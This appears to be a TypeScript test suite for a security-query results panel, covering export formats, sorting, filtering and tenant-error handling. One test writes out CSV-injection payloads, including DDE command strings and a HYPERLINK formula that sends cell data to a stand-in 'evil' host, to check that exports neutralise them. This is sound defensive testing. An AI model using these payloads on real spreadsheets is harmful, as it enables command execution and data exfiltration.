import * as assert from "node:assert/strict";
import {
  cellText,
  clampFocus,
  filterColumnAfter,
  filterRows,
  formatRows,
  neutraliseFormula,
  sortKind,
  sortRows,
  toCsv,
  toJsonl,
  toMarkdown,
} from "../../../src/features/query/format";
import { credentialVariables } from "../../../src/features/query/platforms";
import type { QueryPanelState } from "../../../src/features/query/protocol";
import {
  applyProgress,
  canStartRun,
  choosingState,
  credentialAction,
  errorVariables,
  exportable,
  formatMs,
  keepable,
  parseCredentialAction,
  pendingTabs,
  progressFromEvent,
  queryIdentity,
  queryViewState,
  tabSummary,
  tabsFromDocument,
  tenantErrorKind,
  viewApplies,
} from "../../../src/features/query/results";

// A Sentinel rule on two tenants, one answering 403 (the shape of `opentide --json query`).
const DOCUMENT = {
  platform: "sentinel",
  source: "rule",
  tenants: ["prod", "dev"],
  results: [
    {
      tenant: "prod",
      status: "ok",
      columns: [
        { name: "TimeGenerated", type: "datetime" },
        { name: "DeviceName", type: "string" },
        { name: "Count", type: "long" },
      ],
      rows: [
        { TimeGenerated: "2026-11-03T09:12:44Z", DeviceName: "ws-0142", Count: 10 },
        { TimeGenerated: "2026-11-03T08:00:00Z", DeviceName: "ws, 7", Count: 2 },
        { TimeGenerated: null, DeviceName: 'say "hi"', Count: null },
      ],
      row_count: 3,
      truncated: true,
      sent: "SecurityEvent | take 3",
      vendor_query_id: "q-1",
      warnings: [],
      elapsed_ms: 1800,
    },
    {
      tenant: "dev",
      status: "failed",
      error: "HTTP 403 Forbidden",
      detail: "AuthorizationFailed",
      warnings: [],
      elapsed_ms: 40,
    },
  ],
  exit_code: 1,
};

describe("query results (#17)", () => {
  it("makes one result tab and one error tab", () => {
    const [ok, failed] = tabsFromDocument(DOCUMENT);
    assert.equal(ok?.status, "ok");
    assert.equal(ok?.rows.length, 3);
    assert.equal(ok?.truncated, true);
    assert.equal(ok?.sent, "SecurityEvent | take 3");
    assert.equal(ok?.vendorQueryId, "q-1");
    assert.equal(failed?.status, "failed");
    assert.equal(failed?.error, "HTTP 403 Forbidden");
    assert.equal(failed?.detail, "AuthorizationFailed");
    assert.ok(ok && failed);
    assert.equal(tabSummary(ok), "3 rows+ · 1.8 s");
    assert.equal(tabSummary(failed), "failed · 40 ms");
  });

  it("exports the first tab as CSV, as opentide query --format csv quotes it", () => {
    const [ok] = tabsFromDocument(DOCUMENT);
    assert.ok(ok);
    assert.equal(
      toCsv(ok.columns, ok.rows),
      'TimeGenerated,DeviceName,Count\r\n2026-11-03T09:12:44Z,ws-0142,10\r\n2026-11-03T08:00:00Z,"ws, 7",2\r\n,"say ""hi""",\r\n',
    );
  });

  it("takes columns from the rows when the platform names none", () => {
    const [tab] = tabsFromDocument({ results: [{ tenant: "t", status: "ok", rows: [{ a: 1 }, { b: 2 }] }] });
    assert.deepEqual(
      tab?.columns.map((c) => c.name),
      ["a", "b"],
    );
  });

  it("sorts by type, empty values last, and filters in one or every column", () => {
    const [ok] = tabsFromDocument(DOCUMENT);
    assert.ok(ok);
    const count = ok.columns[2];
    const time = ok.columns[0];
    assert.ok(count && time);
    assert.equal(sortKind(count, ok.rows), "number");
    assert.equal(sortKind(time, ok.rows), "date");
    assert.deepEqual(
      sortRows(ok.rows, "Count", "number", false).map((r) => r.Count),
      [2, 10, null],
    );
    assert.deepEqual(
      sortRows(ok.rows, "Count", "number", true).map((r) => r.Count),
      [10, 2, null],
    );
    assert.deepEqual(
      sortRows(ok.rows, "TimeGenerated", "date", false).map((r) => r.DeviceName),
      ["ws, 7", "ws-0142", 'say "hi"'],
    );
    assert.equal(filterRows(ok.rows, ok.columns, "WS-").length, 1);
    assert.equal(filterRows(ok.rows, ok.columns, "10", "DeviceName").length, 0);
    assert.equal(filterRows(ok.rows, ok.columns, "  ").length, 3);
  });

  it("writes JSONL, JSON and Markdown", () => {
    const columns = [{ name: "a" }, { name: "b|c" }];
    const rows = [{ a: { x: 1 }, "b|c": "l1\nl2" }];
    assert.equal(toJsonl(columns, rows), '{"a":{"x":1},"b|c":"l1\\nl2"}\n');
    assert.equal(toMarkdown(columns, rows), '| a | b\\|c |\n| --- | --- |\n| {"x":1} | l1<br>l2 |\n');
    assert.deepEqual(JSON.parse(formatRows("json", columns, rows)), [{ a: { x: 1 }, "b|c": "l1\nl2" }]);
    assert.equal(cellText(null), "");
    assert.equal(cellText(true), "true");
  });

  it("shows tenant progress events (opentide#756) before the rows arrive", () => {
    const event = {
      event: "tenant",
      platform: "sentinel",
      tenant: "prod",
      status: "ok",
      rows: 120,
      elapsed_ms: 1800,
    };
    const progress = progressFromEvent(event);
    assert.ok(progress);
    const tabs = applyProgress(pendingTabs(["prod", "dev"]), progress);
    const [prod, dev] = tabs;
    assert.ok(prod && dev);
    assert.equal(prod.status, "ok");
    assert.equal(prod.rowCount, 120);
    assert.equal(dev.status, "pending");
    assert.equal(tabSummary(prod), "120 rows · 1.8 s");
    // A run with no tenant list gains a tab per event.
    assert.equal(applyProgress([], progress).length, 1);
    assert.equal(progressFromEvent({ event: "progress", step: "x" }), undefined);
  });

  it("formats durations", () => {
    assert.equal(formatMs(250), "250 ms");
    assert.equal(formatMs(1800), "1.8 s");
    assert.equal(formatMs(125_000), "2 min 5 s");
  });
});

describe("query: results kept from a closed panel (opentide.query.retainResults)", () => {
  it("keeps a finished run, never one closed while running", () => {
    assert.equal(keepable({ phase: "running" }), false);
    assert.equal(keepable(undefined), false);
    for (const phase of ["done", "failed", "cancelled"]) assert.equal(keepable({ phase }), true);
  });
});

describe("query: what Copy and Export act on", () => {
  const [pending] = pendingTabs(["B"]);
  const tab = (overrides: object) => ({ ...(pending as NonNullable<typeof pending>), ...overrides });
  it("only a finished tab of its own rows: never a failed or empty one, whose table holds another's", () => {
    const ok = tab({ status: "ok", rows: [{ a: 1 }], columns: [{ name: "a" }] });
    assert.equal(exportable(ok, "done"), true);
    assert.equal(exportable(ok, "running"), false);
    assert.equal(exportable(tab({ status: "failed" }), "done"), false);
    assert.equal(exportable(tab({ status: "ok", rows: [] }), "done"), false);
    assert.equal(exportable(pending, "done"), false);
    assert.equal(exportable(undefined, "done"), false);
  });
});

describe("query: the table's focus and view across tabs", () => {
  it("moves a focused cell into a tab with fewer columns or rows", () => {
    assert.deepEqual(clampFocus({ row: 4, column: 8 }, 10, 3), { row: 4, column: 2 });
    assert.deepEqual(clampFocus({ row: 40, column: 1 }, 10, 3), { row: 9, column: 1 });
    assert.deepEqual(clampFocus({ row: 3, column: 3 }, 0, 0), { row: 0, column: 0 });
  });

  it("keeps Filter in column across a re-run, a pending tab or a failed one", () => {
    // Re-run: the table empties (no columns) before the rows come back.
    const emptied = filterColumnAfter("User", []);
    assert.deepEqual(emptied, { value: "", pending: "User" });
    assert.deepEqual(filterColumnAfter(emptied.pending ?? "", ["Time", "User"]), {
      value: "User",
      pending: undefined,
    });
    assert.deepEqual(filterColumnAfter("User", ["Time"]), { value: "", pending: undefined }, "as the sort");
    assert.deepEqual(filterColumnAfter("", []), { value: "", pending: undefined });
  });

  it("keeps the selected tab, filter and sort, and nothing it cannot read", () => {
    const state = {
      selected: "prod",
      table: { filter: "lsass", filterColumn: "User", sort: { column: "Time", descending: true } },
    };
    assert.deepEqual(queryViewState(JSON.parse(JSON.stringify(state))), state);
    assert.deepEqual(queryViewState({ selected: 3, table: { filter: 1 } }), {});
    assert.deepEqual(queryViewState(undefined), {});
    assert.deepEqual(queryViewState({ table: { filter: "", filterColumn: "", sort: { column: 1 } } }), {
      table: { filter: "", filterColumn: "" },
    });
  });
});

describe("query: CSV of attacker-controlled telemetry (CSV injection)", () => {
  it("prefixes a quote to cells a spreadsheet would evaluate, and leaves numbers alone", () => {
    const columns = [{ name: "CommandLine" }, { name: "User" }];
    const rows = [
      { CommandLine: "=cmd|' /C calc'!A0", User: "+SUM(1+1)" },
      { CommandLine: '=HYPERLINK("http://evil/?"&A1,"x")', User: -2 },
      { CommandLine: "@SUM(1+1)*cmd|' /C calc'!A0", User: "-2+3" },
      { CommandLine: "\tx", User: "plain" },
    ];
    assert.equal(
      toCsv(columns, rows),
      [
        "CommandLine,User",
        "'=cmd|' /C calc'!A0,'+SUM(1+1)",
        `"'=HYPERLINK(""http://evil/?""&A1,""x"")",-2`,
        "'@SUM(1+1)*cmd|' /C calc'!A0,'-2+3",
        "'\tx,plain",
        "",
      ].join("\r\n"),
    );
    assert.equal(neutraliseFormula("-1.5e3"), "-1.5e3");
    assert.equal(neutraliseFormula("+7"), "+7");
    assert.equal(neutraliseFormula("- list item"), "'- list item");
    assert.equal(
      formatRows("json", columns, [rows[0] as (typeof rows)[0]]).includes("'="),
      false,
      "JSON untouched",
    );
  });
});

describe("query: while the tenant picker is open (#47)", () => {
  it("stops showing a run in progress once opentide asks which tenants", () => {
    const running: QueryPanelState = {
      title: "Suspicious LSASS Access · Microsoft Sentinel",
      name: "Suspicious LSASS Access",
      platformId: "sentinel",
      locked: false,
      tenants: [],
      platform: "Microsoft Sentinel",
      windowLabel: "last 24 hours",
      limit: 100,
      maxLimit: 5000,
      contacts: "the Microsoft Sentinel tenant",
      phase: "running",
      startedAt: 0,
      durationMs: null,
      argvDisplay: "opentide --json query --platform sentinel",
      message: "",
      failure: null,
      tabs: pendingTabs([]),
      writesPreviewAlerts: false,
      cancelMayLeaveSearch: false,
      query: null,
    };
    const choosing = choosingState(running, 1200);
    assert.equal(choosing.phase, "choosing", "no Running…, timer or Cancel");
    assert.equal(choosing.message, "Pick the Microsoft Sentinel tenants to query");
    assert.equal(choosing.durationMs, 1200);
    assert.deepEqual(choosing.tabs, []);
    assert.equal(keepable(choosing), false, "a panel closed while picking is not kept");
    assert.equal(canStartRun(choosing.phase), false, "no Re-run or Tenants while the picker is open");
    assert.equal(canStartRun("running"), false);
    for (const phase of ["done", "failed", "cancelled"]) assert.equal(canStartRun(phase), true, phase);
  });
});

describe("query: what a failed tenant offers next", () => {
  it("tells unset credentials, refused credentials and an unreachable tenant apart", () => {
    const unset =
      "Sentinel credentials are unset ($AZURE_CLIENT_ID, $AZURE_CLIENT_SECRET). Set those environment variables before a live check.";
    assert.equal(tenantErrorKind(unset, null), "credentials");
    assert.deepEqual(errorVariables(unset), ["AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET"]);
    assert.equal(tenantErrorKind("HTTP 403 Forbidden", "AuthorizationFailed"), "auth");
    assert.equal(tenantErrorKind("cannot authenticate to sentinel tenant 'prod': bad secret", null), "auth");
    assert.equal(
      tenantErrorKind(
        "sentinel tenant 'prod' did not answer the query within 60s: timed out",
        "narrow the window",
      ),
      "network",
    );
    assert.equal(tenantErrorKind("Cannot reach api.example.com", null), "network");
    assert.equal(tenantErrorKind("KeyError: 'rows'", null), "other");
    assert.equal(tenantErrorKind(null, null), "other");
    assert.deepEqual(errorVariables("no variables here"), []);
  });

  it("classifies each failed tab of a document, and no ok tab", () => {
    const [ok, failed] = tabsFromDocument({
      results: [
        { tenant: "prod", status: "ok", columns: [{ name: "a" }], rows: [{ a: 1 }] },
        { tenant: "dev", status: "failed", error: "credentials are unset ($DEV_TOKEN)" },
      ],
    });
    assert.equal(ok?.errorKind, null);
    assert.deepEqual(ok?.variables, []);
    assert.equal(failed?.errorKind, "credentials");
    assert.deepEqual(failed?.variables, ["DEV_TOKEN"]);
  });
});

describe("query: a retargeted panel's table view", () => {
  it("keeps the filter and sort for the same query only", () => {
    const a = { name: "LSASS handle", platformId: "sentinel" };
    assert.equal(viewApplies(undefined, a), true, "a fresh page takes what was saved");
    assert.equal(viewApplies(queryIdentity(a), a), true);
    assert.equal(viewApplies(queryIdentity(a), { ...a, name: "Other rule" }), false);
    assert.equal(viewApplies(queryIdentity(a), { ...a, platformId: "splunk" }), false);
    assert.deepEqual(queryViewState({ query: queryIdentity(a), selected: "prod" }), {
      selected: "prod",
      query: queryIdentity(a),
    });
    assert.equal(queryViewState({ query: 3 }).query, undefined);
  });
});

describe("query: Set Credential… for a tenant info does not list", () => {
  it("carries the variables the error named, and offers them when info has none", () => {
    const code = credentialAction("staging", ["AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET"]);
    assert.equal(code, "credentials:staging:AZURE_CLIENT_ID,AZURE_CLIENT_SECRET");
    assert.deepEqual(parseCredentialAction(code), {
      tenant: "staging",
      variables: ["AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET"],
    });
    assert.deepEqual(parseCredentialAction(credentialAction("prod", [])), { tenant: "prod", variables: [] });
    assert.equal(parseCredentialAction("credentials:x:not valid"), undefined);
    assert.equal(parseCredentialAction("configure"), undefined);
    // Not in info: the error's variables, unset, instead of a dead end.
    assert.deepEqual(credentialVariables([], ["AZURE_CLIENT_ID", "AZURE_CLIENT_ID"]), [
      { name: "AZURE_CLIENT_ID", set: false },
    ]);
    const known = [
      {
        name: "prod",
        description: "",
        strategies: [],
        manual: false,
        variables: [{ name: "TOKEN", set: true }],
      },
    ];
    assert.deepEqual(
      credentialVariables(known, ["OTHER"]),
      [{ name: "TOKEN", set: true }],
      "info's list wins",
    );
  });
});
